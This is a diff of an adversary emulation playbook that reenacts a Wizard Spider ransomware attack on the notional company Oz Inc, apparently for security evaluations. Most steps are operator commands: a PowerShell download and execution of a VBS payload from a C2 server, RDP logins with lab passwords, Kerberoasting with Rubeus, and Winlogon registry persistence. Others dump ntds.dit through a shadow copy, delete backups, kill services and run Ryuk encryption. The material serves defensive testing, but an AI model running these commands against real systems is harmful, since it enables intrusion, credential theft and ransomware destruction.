@@ -1,4 +1,4 @@
-# Scenario Overview (Protections)
+# Scenario Overview
 
 This scenario emulates Wizard Spider conducting a ransomware attack against a notional organization (Oz Inc).
 
@@ -8,15 +8,9 @@ This scenario emulates Wizard Spider TTPs based on  several malware specimens ei
 2. Trickbot
 3. Ryuk
 
-The steps in this scenario are grouped to support Protections Evaluations.
-
-![Wizard Spider Protections Diagram](../../Resources/images/Wizard%20Spider%20Protections%20Diagram.drawio-2.png)
-
 ---
 
-## Test 1 (steps 1-3)
-
-### Step 1 - Initial Compromise
+## Step 1 - Initial Compromise
 
 :microphone: `Voice Track:`
 
@@ -44,7 +38,7 @@ C2:	192.168.0.4:80 HTTP; traffic is AES-encrypted with symmetric key and base64 
 
 ---
 
-#### ☣️ Procedures
+### ☣️ Procedures
 
 Upload the Emotet-dropper document to Dorothy's desktop:
 
@@ -63,7 +57,7 @@ Open a new terminal tab (ctrl-shift-T); double click the terminal tab and rename
 
 RDP into Dorothy / 10.0.0.7 as user Judy:
 
-```sh
+```bash
 xfreerdp +clipboard /u:oz\\judy /p:"Passw0rd!" /v:10.0.0.7
 ```
 
@@ -77,7 +71,7 @@ xfreerdp +clipboard /u:oz\\judy /p:"Passw0rd!" /v:10.0.0.7
 
 5. Take a screenshot of your new session, and paste in the vendor slack channel.
 
-```bash
+```
 # Emotet has sent Microsoft Word documents with embedded macros that will invoke scripts to download additional payloads. [6][13][2][8][12]
 ```
 
@@ -91,17 +85,17 @@ xfreerdp +clipboard /u:oz\\judy /p:"Passw0rd!" /v:10.0.0.7
 
 Open PowerShell and run:
 
-```powershell
+```pwsh
 Invoke-WebRequest -Uri http://192.168.0.4:8080/getFile/adb.txt -OutFile $env:AppData\adb.vbs
 ```
 
-```bash
+```pwsh
 # Wizard Spider has used HTTP for network communications.[5]
 
 cscript.exe $env:AppData\adb.vbs
 ```
 
-#### :microscope: Cited Intelligence
+### :microscope: Cited Intelligence
 
 * <https://documents.trendmicro.com/assets/white_papers/ExploringEmotetsActivities_Final.pdf>
 
@@ -113,7 +107,7 @@ cscript.exe $env:AppData\adb.vbs
 
 * <https://blog.talosintelligence.com/2019/01/return-of-emotet.html>
 
-### Step 2 - Emotet Persistence
+## Step 2 - Emotet Persistence
 
 :microphone: `Voice Track:`
 
@@ -131,7 +125,7 @@ The registry key is written using the `RegSetValueExA` WinAPI function.
 
 ---
 
-#### ☣️ Procedures
+### ☣️ Procedures
 
 Open a horizontal terminal tab (right-click split horizontally).
 
@@ -147,7 +141,7 @@ Copy/paste the command in your lower terminal tab:
 
 [Source Code](../../Resources/Emotet/EmotetClientDLL/EmotetClientDLL/persistence.cpp#L21)
 
-#### :microscope: Cited Intelligence
+### :microscope: Cited Intelligence
 
 * <https://www.cynet.com/attack-techniques-hands-on/emotet-vs-trump-deep-dive-analysis-of-a-killer-info-stealer/>
 
@@ -159,7 +153,7 @@ Copy/paste the command in your lower terminal tab:
 
 <br>
 
-### Step 3 - Emotet Host Discovery and Credential Collection
+## Step 3 - Emotet Host Discovery and Credential Collection
 
 :microphone: `Voice Track:`
 
@@ -183,7 +177,7 @@ File Write:     C:\Windows\SysWOW64\Outlook.dll
 
 ---
 
-#### ☣️ Procedures
+### ☣️ Procedures
 
 Enumerate processes.
 
@@ -239,7 +233,7 @@ Scrape email addresses from inbox.
 
 <br>
 
-#### :microscope: Cited Intelligence
+### :microscope: Cited Intelligence
 
 * <https://unit42.paloaltonetworks.com/emotet-command-and-control/>
 
@@ -251,9 +245,7 @@ Scrape email addresses from inbox.
 
 <br>
 
-## Test 2 (Steps 4-6)
-
-### Step 4 - Move Laterally Deploy TrickBot
+## Step 4 - Move Laterally Deploy TrickBot
 
 :microphone: `Voice Track:`
 
@@ -279,7 +271,7 @@ C2:	192.168.0.4:447 HTTP - no encryption or obfuscation
 
 ---
 
-#### ☣️ Procedures
+### ☣️ Procedures
 
 Change your RDP tab name to "RDP into Toto"
 
@@ -307,13 +299,17 @@ cd %AppData%
 uxtheme.exe
 ```
 
-#### :microscope: Cited Intelligence
+Switch back to your C2 terminal window.
+
+Take a screenshot of the new Trickbot session, and paste in Slack.
+
+### :microscope: Cited Intelligence
 
 * <https://attack.mitre.org/groups/G0102/>
 
 * <https://www.crowdstrike.com/blog/timelining-grim-spiders-big-game-hunting-tactics/>
 
-### Step 5 - TrickBot Discovery
+## Step 5 - TrickBot Discovery
 
 :microphone: `Voice Track:`
 
@@ -323,11 +319,9 @@ You will see TrickBot executing shell commands, such as systeminfo, sc.exe, net.
 
 Trickbot executes commands via the C standard library function, `system()`.
 
-#### ☣️ Procedures
+### ☣️ Procedures
 
-Switch back to your C2 terminal window.
-
-Execute the following commands.
+From your C2 server tab, execute the following commands.
 
 ```bash
 # TrickBot gathers the OS version, machine name, CPU type, amount of RAM available, and UEFI/BIOS firmware information from the victim’s machine.[1][2][7][12]
@@ -376,7 +370,7 @@ Execute the following commands.
 ./evalsC2client.py --set-task TrickBot-Implant "whoami /groups >> discovery.txt"
 ```
 
-#### :microscope: Cited Intelligence
+### :microscope: Cited Intelligence
 
 * <https://www.securityartwork.es/wp-content/uploads/2017/07/Trickbot-report-S2-Grupo.pdf>
 * <https://www.fidelissecurity.com/threatgeek/2016/10/trickbot-we-missed-you-dyre>
@@ -384,7 +378,7 @@ Execute the following commands.
 * <https://www.cybereason.com/blog/dropping-anchor-from-a-trickbot-infection-to-the-discovery-of-the-anchor-malware>
 * <https://eclypsium.com/wp-content/uploads/2020/12/TrickBot-Now-Offers-TrickBoot-Persist-Brick-Profit.pdf>
 
-### Step 6 - Kerberoast the DC
+## Step 6 - Kerberoast the DC
 
 :microphone: `Voice Track:`
 
@@ -398,7 +392,7 @@ Wizard Spider cracks the credentials offline for use in the next step.
 
 ---
 
-#### ☣️ Procedures
+### ☣️ Procedures
 
 ```bash
 # Wizard Spider has used Rubeus, MimiKatz Kerberos module, and the Invoke-Kerberoast cmdlet to steal AES hashes.[6][3][2][8]
@@ -410,7 +404,7 @@ Wizard Spider cracks the credentials offline for use in the next step.
 ./evalsC2client.py --set-task TrickBot-Implant "rubeus.exe kerberoast /domain:oz.local"
 ```
 
-#### :microscope: Cited Intelligence
+### :microscope: Cited Intelligence
 
 * <https://us-cert.cisa.gov/ncas/alerts/aa20-302a>
 * <https://www.fireeye.com/blog/threat-research/2020/10/kegtap-and-singlemalt-with-a-ransomware-chaser.html>
@@ -419,9 +413,7 @@ Wizard Spider cracks the credentials offline for use in the next step.
 
 <br>
 
-## Test 3 (Step 7)
-
-### Step 7 - Lateral Movement to DC
+## Step 7 - Lateral Movement to DC
 
 :microphone: `Voice Track:`
 
@@ -469,17 +461,17 @@ xfreerdp +clipboard /u:oz\\vfleming /p:"q27VYN8xflPcYumbLMit" /v:10.0.0.4 /drive
 
 Download a trickbot variant (same binary with a zero appended to the very end)
 
-```bash
+```pwsh
 # Wizard Spider has established persistence using Userinit by adding the Registry key HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon.[3]
 
 Invoke-WebRequest -Uri http://192.168.0.4:8080/getFile/uxtheme.exe -OutFile $env:AppData\uxtheme.exe
 ```
 
-```bash
+```pwsh
 Set-ItemProperty "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\" "Userinit" "Userinit.exe, $env:AppData\uxtheme.exe" -Force
 ```
 
-```bash
+```pwsh
 # Wizard Spider has also used AdFind and nltest/dclist to enumerate domain computers, including the domain controller.[4][5][3][7][6]
 
 adfind -f "(objectcategory=group)"
@@ -495,9 +487,7 @@ adfind -f "(objectcategory=group)"
 * <https://thedfirreport.com/2020/10/08/ryuks-return/>
 * <https://redcanary.com/blog/how-one-hospital-thwarted-a-ryuk-ransomware-outbreak/>
 
-## Test 4 (Step 8)
-
-### Step 8 - Dump Active Directory Database (ntds.dit)
+## Step 8 - Dump Active Directory Database (ntds.dit)
 
 :microphone: `Voice Track:`
 
@@ -537,15 +527,15 @@ vssadmin output:
 
 :warning: Make sure the `\\\\?\GLOBALROOT...HarddiskVolumeShadowCopy1` path matches your output!
 
-```bat
+```bash
 copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit \\TSCLIENT\X\ntds.dit
 ```
 
-```bat
+```bash
 copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM \\TSCLIENT\X\VSC_SYSTEM_HIVE
 ```
 
-```bat
+```bash
 reg SAVE HKLM\SYSTEM \\TSCLIENT\X\SYSTEM_HIVE
 ```
 
@@ -557,9 +547,7 @@ Notionally, Wizard Spider carves credentials offline from ntds.dit using tools l
 
 <br>
 
-## Test 5 (Step 9)
-
-### Step 9 - Ryuk Inhibit System Recovery
+## Step 9 - Ryuk Inhibit System Recovery
 
 :microphone: `Voice Track:`
 
@@ -577,9 +565,9 @@ These files are used to stop specific services and delete backups prior to encry
 
 ### ☣️ Procedures
 
-In the CMD session, mount share so Ryuk can encrypt lateral drives:
+Mount share so Ryuk can encrypt lateral drives:
 
-```bat
+```bash
 net use Z: \\10.0.0.8\C$
 ```
 
@@ -589,7 +577,9 @@ net use Z: \\10.0.0.8\C$
 # Ryuk can launch icacls /grant Everyone:F /T /C /Q to delete every access-based restrictions on files and directories.[4]
 
 # Ryuk has stopped services related to anti-virus.[2]
+```
 
+```
 copy \\TSCLIENT\X\kill.bat C:\Users\Public\kill.bat
 
 C:\Users\Public\kill.bat
@@ -599,7 +589,9 @@ C:\Users\Public\kill.bat
 
 ```bash
 # Ryuk has used vssadmin Delete Shadows /all /quiet to to delete volume shadow copies and vssadmin resize shadowstorage to force deletion of shadow copies created by third-party applications.[1]
+```
 
+```
 copy \\TSCLIENT\X\window.bat C:\Users\Public\window.bat
 
 C:\Users\Public\window.bat
@@ -615,13 +607,11 @@ C:\Users\Public\window.bat
 
 <br>
 
-## Test 6 (Step 10)
-
-### Step 10 - Ryuk Encryption for Impact
+## Step 10 - Ryuk Encryption for Impact
 
 :microphone: `Voice Track:`
 
-In our final test, Wizard Spider uploads and executes Ryuk.
+In our final step, Wizard Spider uploads and executes Ryuk.
 
 Ryuk is uploaded using the RDP-mounted network share, and executed from CMD.
 
@@ -643,8 +633,6 @@ Note that the symmetric key is itself encrypted with RSA2048.
 
 ### ☣️ Procedures
 
-From the pre-existing CMD session, run the following:
-
 ```bash
 # Ryuk has attempted to adjust its token privileges to have the SeDebugPrivilege.[11]
 
@@ -657,7 +645,9 @@ From the pre-existing CMD session, run the following:
 # Ryuk has used the C$ network share for lateral movement.[5]
 
 # Ryuk has called GetIpNetTable in attempt to identify all mounted drives and hosts that have Address Resolution Protocol (ARP) entries.[1][5]
+```
 
+```
 copy \\TSCLIENT\X\ryuk.exe C:\Users\Public\ryuk.exe
 ```
 
